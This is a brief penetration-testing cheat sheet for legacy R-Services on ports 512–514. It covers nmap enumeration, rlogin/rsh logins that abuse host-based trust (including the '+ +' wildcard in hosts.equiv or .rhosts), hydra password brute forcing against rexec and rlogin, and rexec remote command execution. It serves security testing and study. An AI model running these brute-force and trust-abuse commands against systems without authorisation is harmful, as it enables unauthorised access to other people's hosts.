# R-Services (512–514)

!!! tip "Start here"
    Test whether host-based trust permits a scoped account: `rlogin -l $USERNAME $IP` or `rsh -l $USERNAME $IP id`. Successful access depends on `/etc/hosts.equiv`, `.rhosts`, source identity, and server policy.

---

## Enumeration

```bash
nmap -sV -p 512-514 $IP
```

---

## Trust-Based Access (rlogin / rsh)

```bash
rlogin -l "$USERNAME" $IP
rsh -l "$USERNAME" $IP id
rsh -l "$USERNAME" $IP
```

Authentication relies on `/etc/hosts.equiv` and `~/.rhosts`. If either contains `+ +`, any host can authenticate as any user.

---

## Brute Force

```bash
hydra -L users.txt -P passwords.txt rexec://$IP
hydra -L users.txt -P passwords.txt rlogin://$IP
```

---

## Remote Execution (rexec)

```bash
rexec $IP -l "$USERNAME" -p "$PASSWORD" "id"
```
